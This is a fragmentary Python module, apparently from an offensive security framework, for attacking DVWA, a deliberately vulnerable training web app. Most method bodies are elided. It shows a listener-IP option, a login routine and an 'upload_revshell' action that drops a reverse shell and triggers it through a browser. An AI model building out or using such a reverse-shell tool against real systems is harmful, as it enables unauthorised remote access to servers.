...
class DVWARCE(BaseModule):
    def __init__(self):
        ...
        self.options = {
            ...
            "LHOST": {"value": self.get_local_ip(), "required": True, "description": "Listener IP (your machine)"},
    ...
    def _login(self):
        if self.logged_in:
            print(colored("[+] Already logged in", "green"))
            return
    ...
    def run(self):
        ...
        print("  upload_revshell      - Drop + catch reverse shell")
    ...
    def upload_revshell(self):
        ...
        print(colored("Browser opened to trigger shell. Check new terminal for connection.", "green"))